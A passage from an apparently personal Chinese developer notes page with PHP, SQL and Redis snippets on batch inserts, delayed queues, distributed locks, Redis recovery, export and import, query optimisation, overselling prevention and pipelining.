class="comment">//程序运行时间</span></span><br><span class="line">		$t2 = microtime(<span class="literal">true</span>);</span><br><span class="line">		echo <span class="string">'循环耗时：'</span>.round($t2-$t1,<span class="number">3</span>).<span class="string">'秒&lt;br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		$<span class="keyword">this</span>-&gt;db-&gt;query($sql);  <span class="comment">//批量插入</span></span><br><span class="line">		</span><br><span class="line">		$t3 = microtime(<span class="literal">true</span>);</span><br><span class="line">		echo <span class="string">'插入耗时：'</span>.round($t3-$t2,<span class="number">3</span>).<span class="string">'秒&lt;br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		echo <span class="string">'内存消耗：'</span>.round(memory_get_usage()/<span class="number">1048576</span>,<span class="number">2</span>).<span class="string">" M&lt;br/&gt;"</span>;</span><br><span class="line">	</span><br><span class="line">	&#125;拼接语句可能会报错</span><br><span class="line">     设置一下</span><br><span class="line">     </span><br><span class="line">     max_allowed_packet = <span class="number">500</span>M</span><br><span class="line">     </span><br><span class="line">     允许mysql 接受数据包大小。</span><br></pre></td></tr></table></figure>
<h3 id="Redis延时队列"><a href="#Redis延时队列" class="headerlink" title="Redis延时队列"></a>Redis延时队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//rsy.me/posts/redis-application-in-web-development/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</span></span><br><span class="line">$queueKey = <span class="string">"queue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line">$redis-&gt;rpush($queueKey, $data)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    $data = $redis-&gt;lpop($queueKey);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> === $data) &#123;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 业务逻辑</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queueKey = <span class="string">"queue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产消息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费时间, 这里设置为1小时候</span></span><br><span class="line">$consumeTimestamp = time() + <span class="number">3600</span>;</span><br><span class="line"><span class="comment">// $data需要添加随机串前缀(or后缀)，防止出现重复member被丢弃</span></span><br><span class="line">$data = $data . md5(uniqid(rand(), <span class="literal">true</span>));</span><br><span class="line">$redis-&gt;zadd($queueKey, $consumeTimestamp, $data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费消息</span></span><br><span class="line"><span class="keyword">while</span> (tue) &#123;</span><br><span class="line">    $arrData = $redis-&gt;zrangebyscore($queueKey, <span class="number">0</span>, time());</span><br><span class="line">    <span class="keyword">if</span> (!$arrData) &#123;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 业务逻辑</span></span><br><span class="line">    foreach ($arrData <span class="keyword">as</span> $data) &#123;</span><br><span class="line">        $data = substr($data, <span class="number">0</span>, strlen($data) - <span class="number">32</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 消费$data</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-分布式锁"><a href="#redis-分布式锁" class="headerlink" title="redis 分布式锁"></a>redis 分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$lockStatus = $redis-&gt;setnx($lockKey, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁成功，为锁设置超时时间</span></span><br><span class="line">    $redis-&gt;expire($lockKey, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行后续操作</span></span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="number">0</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁失败</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 其他异常</span></span><br><span class="line">&#125;</span><br><span class="line">$lockStatus = $<span class="keyword">this</span>-&gt;redis-&gt;set($lockKey, <span class="number">1</span>, <span class="string">"EX"</span>, <span class="number">30</span>, <span class="string">"NX"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"OK"</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁成功，可进行后续操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//业务逻辑执行完毕，释放锁</span></span><br><span class="line">    $<span class="keyword">this</span>-&gt;redis-&gt;del($lockKey);</span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="literal">null</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁失败</span></span><br><span class="line">&#125;</span><br><span class="line">$lockToken = md5(uniqid(rand(), <span class="literal">true</span>));</span><br><span class="line"><span class="comment">// 此处超时时间根据具体业务逻辑配置</span></span><br><span class="line">$expire = rand(<span class="number">280</span>, <span class="number">320</span>);</span><br><span class="line">$lockStatus = $<span class="keyword">this</span>-&gt;redis-&gt;set($lockKey, $lockToken, <span class="string">"EX"</span>, $expire, <span class="string">"NX"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"OK"</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁成功，可进行后续操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 业务逻辑执行完毕，释放锁</span></span><br><span class="line">    <span class="comment">// 删除锁之前需要判断是否是自己上的锁</span></span><br><span class="line">    $currentToken = $<span class="keyword">this</span>-&gt;redis-&gt;get($lockKey);</span><br><span class="line">    <span class="keyword">if</span> ($currentToken === $lockToken) &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;del($lockKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; elseif (<span class="literal">null</span> === $lockStatus) &#123;</span><br><span class="line">    <span class="comment">// 加锁失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-无法启动"><a href="#redis-无法启动" class="headerlink" title="redis 无法启动"></a>redis 无法启动</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis突然挂掉后，无法启动，查看log日志，发现报Short read or OOM loading DB. Unrecoverable error, aborting now</span><br><span class="line">[root@localhost ~]# rm -f /var/lib/redis/dump.rdb  </span><br><span class="line">[root@localhost ~]# rm -f /var/run/redis.pid  </span><br><span class="line">[root@localhost ~]# service redis start</span><br></pre></td></tr></table></figure>
<h3 id="redis-导出-导入"><a href="#redis-导出-导入" class="headerlink" title="redis 导出 导入"></a>redis 导出 导入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost tank]# yum install ruby rubygems ruby-devel   //安装rubygems 以及相关包  </span><br><span class="line">  </span><br><span class="line">[root@localhost tank]# gem sources -a http://ruby.taobao.org/   //源，加入淘宝，外面的源不能访问  </span><br><span class="line">http:<span class="comment">//ruby.taobao.org/ added to sources  </span></span><br><span class="line">  </span><br><span class="line">[root@localhost tank]# gem install redis-dump -V   //安装redis-dump </span><br><span class="line">查看复制打印?</span><br><span class="line">[root@localhost tank]# telnet 127.0.0.1 6379 //telnet到redis  </span><br><span class="line">Trying <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>...  </span><br><span class="line">Connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.  </span><br><span class="line">Escape character is <span class="string">'^]'</span>.  </span><br><span class="line">set test <span class="number">11</span> <span class="comment">//设置一个值  </span></span><br><span class="line">+OK  </span><br><span class="line">get test <span class="comment">//取值  </span></span><br><span class="line">$<span class="number">2</span>  </span><br><span class="line"><span class="number">11</span>  </span><br><span class="line">  </span><br><span class="line">[root@localhost tank]# redis-dump -u 127.0.0.1:6379 &gt;test.json //导出数据  </span><br><span class="line">[root@localhost tank]# telnet 127.0.0.1 6379 //telnet到redis  </span><br><span class="line">Trying <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>...  </span><br><span class="line">Connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.  </span><br><span class="line">Escape character is <span class="string">'^]'</span>.  </span><br><span class="line">flushall <span class="comment">//请空所有数据  </span></span><br><span class="line">+OK  </span><br><span class="line">keys * <span class="comment">//查看已清空  http://blog.51yip.com/nosql/1656.html</span></span><br><span class="line">*<span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">[root@localhost tank]# &lt; test.json redis-load //导入数据  </span><br><span class="line">  </span><br><span class="line">[root@localhost tank]# telnet 127.0.0.1 6379  </span><br><span class="line">Trying <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>...  </span><br><span class="line">Connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.  </span><br><span class="line">Escape character is <span class="string">'^]'</span>.  </span><br><span class="line">keys * <span class="comment">//已导入成功  </span></span><br><span class="line">*<span class="number">1</span>  </span><br><span class="line">$<span class="number">4</span>  </span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<h3 id="优化not-in-和-lt-gt-查询"><a href="#优化not-in-和-lt-gt-查询" class="headerlink" title="优化not in 和&lt;&gt;查询"></a>优化not in 和&lt;&gt;查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//fanqieto.top/2017/11/26/mysql%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/</span></span><br><span class="line">select customer_id,first_name,last_name,email</span><br><span class="line"><span class="keyword">from</span> customer</span><br><span class="line">where customer_id</span><br><span class="line">not <span class="keyword">in</span> (select customer_id <span class="keyword">from</span> payment)</span><br><span class="line">改为：</span><br><span class="line"></span><br><span class="line">select a.customer_id,a.first_name,a.last_name,a.email </span><br><span class="line"><span class="keyword">from</span> customer a</span><br><span class="line">left join payment b on a.customer_id = b.customer_id</span><br><span class="line">where b.customer_id is <span class="literal">null</span> m</span><br><span class="line">使用汇总表优化查询</span><br><span class="line">例子</span><br><span class="line"></span><br><span class="line">select count(*) <span class="keyword">from</span> product_comment where product_id = <span class="number">999</span></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">create table product_comment_cnt(product_id int, cnt int);</span><br><span class="line">select sum(cnt) <span class="keyword">from</span> (</span><br><span class="line">select cnt <span class="keyword">from</span> product_comment_cnt where product_id = <span class="number">999</span></span><br><span class="line">union all</span><br><span class="line">select count(*) <span class="keyword">from</span> product_comment where product_id = <span class="number">999</span></span><br><span class="line">and timestr &gt; date(now())</span><br><span class="line">) a</span><br></pre></td></tr></table></figure>
<h3 id="Redis的n种妙用"><a href="#Redis的n种妙用" class="headerlink" title="Redis的n种妙用"></a>Redis的n种妙用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">setnx key value，当key不存在时，将 key 的值设为 value ，返回<span class="number">1</span>。若给定的 key 已经存在，则setnx不做任何动作，返回<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当setnx返回<span class="number">1</span>时，表示获取锁，做完操作以后del key，表示释放锁，如果setnx返回<span class="number">0</span>表示获取锁失败</span><br><span class="line"># 实现方式一</span><br><span class="line"># 一直往list左边放</span><br><span class="line">lpush key value </span><br><span class="line"># key这个list有元素时，直接弹出，没有元素被阻塞，直到等待超时或发现可弹出元素为止，上面例子超时时间为10s</span><br><span class="line">brpop key value <span class="number">10</span> </span><br><span class="line"></span><br><span class="line"># 实现方式二</span><br><span class="line">rpush key value</span><br><span class="line">blpop key value <span class="number">10</span></span><br><span class="line"># 参加抽奖活动</span><br><span class="line">sadd key &#123;userId&#125; </span><br><span class="line"></span><br><span class="line"># 获取所有抽奖用户，大轮盘转起来</span><br><span class="line">smembers key </span><br><span class="line"></span><br><span class="line"># 抽取count名中奖者，并从抽奖活动中移除</span><br><span class="line">spop key count </span><br><span class="line"></span><br><span class="line"># 抽取count名中奖者，不从抽奖活动中移除</span><br><span class="line">srandmember key count</span><br><span class="line"># 1001用户给8001帖子点赞</span><br><span class="line">sadd like::<span class="number">8001</span> <span class="number">1001</span></span><br><span class="line"></span><br><span class="line"># 取消点赞</span><br><span class="line">srem like::<span class="number">8001</span> <span class="number">1001</span></span><br><span class="line"></span><br><span class="line"># 检查用户是否点过赞</span><br><span class="line">sismember like::<span class="number">8001</span> <span class="number">1001</span> </span><br><span class="line"></span><br><span class="line"># 获取点赞的用户列表</span><br><span class="line">smembers like::<span class="number">8001</span> </span><br><span class="line"></span><br><span class="line"># 获取点赞用户数</span><br><span class="line">scard like::<span class="number">8001</span> </span><br><span class="line"># 返回sevenSub和qingSub的交集，即seven和青山的共同关注</span><br><span class="line">sinter sevenSub qingSub -&gt; &#123;mic,james&#125;</span><br><span class="line"></span><br><span class="line"># 我关注的人也关注他,下面例子中我是seven</span><br><span class="line"># qing在micSub中返回1，否则返回0</span><br><span class="line">sismember micSub qing</span><br><span class="line">sismember jamesSub qing</span><br><span class="line"></span><br><span class="line"># 我可能认识的人,下面例子中我是seven</span><br><span class="line"># 求qingSub和sevenSub的差集，并存在sevenMayKnow集合中</span><br><span class="line">sdiffstore sevenMayKnow qingSub sevenSub -&gt; &#123;seven,jack&#125;</span><br><span class="line"># 将拯救者y700P-001和ThinkPad-T480这两个元素放到集合brand::lenovo</span><br><span class="line">sadd brand::lenovo 拯救者y700P<span class="number">-001</span> ThinkPad-T480</span><br><span class="line">sadd screenSize::<span class="number">15.6</span> 拯救者y700P<span class="number">-001</span> 机械革命Z2AIR</span><br><span class="line">sadd processor::i7 拯救者y700P<span class="number">-001</span> 机械革命X8TIPlus</span><br><span class="line"></span><br><span class="line"># 获取品牌为联想，屏幕尺寸为15.6，并且处理器为i7的电脑品牌(sinter为获取集合的交集)</span><br><span class="line">sinter brand::lenovo screenSize::<span class="number">15.6</span> processor::i7 -&gt; 拯救者y700P<span class="number">-001</span></span><br><span class="line"># user1的用户分数为 10</span><br><span class="line">zadd ranking <span class="number">10</span> user1</span><br><span class="line">zadd ranking <span class="number">20</span> user2</span><br><span class="line"></span><br><span class="line"># 取分数最高的3个用户</span><br><span class="line">zrevrange ranking <span class="number">0</span> <span class="number">2</span> withscores</span><br><span class="line">Redis 的持久化机制有两种，第一种是快照（RDB RDB是隔一段时间来备份数据），第二种是 AOF 日志。快照是一次全量备份，AOF 日志是连续的增量备份。快照是内存数据的二进制序列化形式，在存储上非常紧凑，而 AOF 日志记录的是内存数据修改的指令记录文本。AOF 日志在长期的运行过程中会变的无比庞大，数据库重启时需要加载 AOF 日志进行指令重放，这个时间就会无比漫长。所以需要定期进行 AOF 重写，给 AOF 日志进行瘦身。</span><br><span class="line">假如客户端每秒发送<span class="number">5000</span>个请求，其中<span class="number">4000</span>个为黑客的恶意攻击，即在数据库中也查不到。举个例子，用户id为正数，黑客构造的用户id为负数，</span><br><span class="line"></span><br><span class="line">如果黑客每秒一直发送这<span class="number">4000</span>个请求，缓存就不起作用，数据库也很快被打死。</span><br><span class="line">如何解决缓存穿透</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询不到的数据也放到缓存，value为空，如set <span class="number">-999</span> “”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">总而言之，缓存雪崩就是缓存失效，请求全部全部打到数据库，数据库瞬间被打死。缓存穿透就是查询了一个一定不存在的数据，并且从存储层查不到的数据没有写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义</span><br><span class="line">https:<span class="comment">//www.itcodemonkey.com/article/12951.html</span></span><br></pre></td></tr></table></figure>
<h3 id="防止库存超卖"><a href="#防止库存超卖" class="headerlink" title="防止库存超卖"></a>防止库存超卖</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/09/record-question-1.html</span></span><br><span class="line"></span><br><span class="line">$num = $redis-&gt;incr($key);</span><br><span class="line"><span class="keyword">if</span> ($num &lt; $max) &#123;</span><br><span class="line">    <span class="comment">//入抢购成功队列，异步去执行抢购成功逻辑</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//不好意思呢，已经被抢完了</span></span><br><span class="line">&#125;</span><br><span class="line">不知道你有没有闻到这段代码的坏味道，在大部分情况下会如你所想地运行，但是特殊场景下会 出现判断失效 的逻辑问题，例如：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、key 由于某些原因失效了；</span><br><span class="line"><span class="number">2</span>、Incr 操作失败了，不会抛异常并返回 <span class="literal">false</span>；</span><br><span class="line">通过日志定位到 Incr 操作问题，便 Telnet 连接到线上 Redis 服务，发现了异常情况：</span><br><span class="line"></span><br><span class="line"># 查看值</span><br><span class="line">GET key</span><br><span class="line"><span class="number">100</span></span><br><span class="line"># 尝试修改</span><br><span class="line">INCR key</span><br><span class="line">READONLY You can<span class="string">'t write against a read only slave</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INFO</span></span><br><span class="line"><span class="string"># Replication</span></span><br><span class="line"><span class="string">role:slave</span></span><br><span class="line"><span class="string">可以看出来，该连接的机器目前处于从机状态，不可写操作，所以 Incr 操作返回 false，同时 PHP 不同类型比较会存在隐式转化，所以false &lt; $num恒成立，导致计数器失效。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">增加计数器容错处理：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$num = $redis-&gt;incr($key);</span></span><br><span class="line"><span class="string">if ($num &gt; 0 &amp;&amp; $num &lt; $max) &#123;</span></span><br><span class="line"><span class="string">    //入抢购成功队列，异步去执行抢购成功逻辑</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    //不好意思呢，已经被抢完了</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">然后，切换 Redis 源到高可用集群（Codis），测试并重新上线，第二日的抢购已经正常，看着 Cat 上流量逐渐平稳，心里也踏实了。</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis管道提升性能"><a href="#Redis管道提升性能" class="headerlink" title="Redis管道提升性能"></a>Redis管道提升性能</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Redis 的 管道 （pipelining）是用来打包多条无关命令批量执行，以减少多个命令分别执行带来的网络交互时间。在一些批量操作数据的场景，使用管道可以显著提升 Redis 的读写性能</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/08/redis-pipelining.html</span></span><br><span class="line"># 安装nc命令</span><br><span class="line">$ yum install nc</span><br><span class="line"># nc打包多个命令</span><br><span class="line">$ (printf <span class="string">"PING\r\nPING\r\nPING\r\n"</span>) | nc localhost <span class="number">6379</span></span><br><span class="line"># 响应</span><br><span class="line">+PONG</span><br><span class="line">+PONG</span><br><span class="line">+PONG</span><br><span class="line">$start = nowTime();</span><br><span class="line">foreach (range(<span class="number">1</span>, <span class="number">1000</span>) <span class="keyword">as</span> $id) &#123;</span><br><span class="line">    $user[] = $redis-&gt;hgetAll($keyPrex.$id);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">'时间：'</span>, nowTime() - $start, <span class="string">'ms'</span>, PHP_EOL;</span><br><span class="line"></span><br><span class="line">时间：<span class="number">39</span>ms</span><br><span class="line">$start = nowTime();</span><br><span class="line">$redis-&gt;multi(Redis::PIPELINE);</span><br><span class="line">foreach (range(<span class="number">1</span>, <span class="number">1000</span>) <span class="keyword">as</span> $id) &#123;</span><br><span class="line">    <span class="comment">//返回资源id相同的socket资源，并未执行命令</span></span><br><span class="line">    $redis-&gt;hgetAll($keyPrex.$id);  </span><br><span class="line">&#125;</span><br><span class="line">$user = $redis-&gt;exec();</span><br><span class="line">echo <span class="string">'时间：'</span>, nowTime() - $start, <span class="string">'ms'</span>, PHP_EOL;</span><br><span class="line"></span><br><span class="line">时间：<span class="number">6</span>ms</span><br><span class="line">在批量操作（查询和写入）数据时，我们应尽量避免多次跟 Redis 的网络交互。这时，可以使用管道实现，也可以 Redis 内嵌 Lua 脚本实现。需要注意的是：</span><br><span class="line"></span><br><span class="line">管道只适用于无因果关联的多命令操作，否则就需要借助 Lua 脚本实现批量操作；</span><br><span class="line">在实际应用中，Redis 往往不可能是单机部署，如果想要在集群中使用管道，可以部署为一主多从架构，此时所有节点的数据都一致，随机选取节点使用管道即可；</span><br><span class="line">总结</span><br><span class="line"></span><br><span class="line">在批量获取数据时，尽管使用 Redis 的管道性能会显著提升，但是使用管道时 Redis 会缓存之前命令的结果，最后一并输出给终端，因此所打包的命令不宜太多，否则内存使用会很严重。</span><br></pre></td></tr></table></figure>
<h3 id="处理重复数据"><a href="#处理重复数据" class="headerlink" title="处理重复数据"></a>处理重复数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE <span class="string">`allowed_user`</span></span><br><span class="line">(</span><br><span class="line">  <span class="string">`id`</span> INT(<span class="number">10</span>) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">  <span class="string">`uid`</span> VARCHAR(<span class="number">36</span>)  DEFAULT <span class="string">''</span>  NOT NULL,</span><br><span class="line">  <span class="string">`last_time`</span> TIMESTAMP  NOT NULL,</span><br><span class="line">  UNIQUE (uid)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`allowed_user`</span> (<span class="string">`uid`</span>, <span class="string">`last_time`</span>) VALUES (<span class="string">'8e9b8c14-fae8-49d4-bbac-a733c09ec82f'</span>, <span class="string">'2017-09-03 19:31:15'</span>)</span><br><span class="line">REPLACE INTO <span class="string">`allowed_user`</span> (<span class="string">`uid`</span>, <span class="string">`last_time`</span>) VALUES (<span class="string">'8e9b8c14-fae8-49d4-bbac-a733c09ec82f'</span>, <span class="string">'2017-09-01 19:31:15'</span>)</span><br><span class="line">注意执行影响行数为 <span class="number">2</span></span><br><span class="line">INSERT INTO <span class="string">`allowed_user`</span> (<span 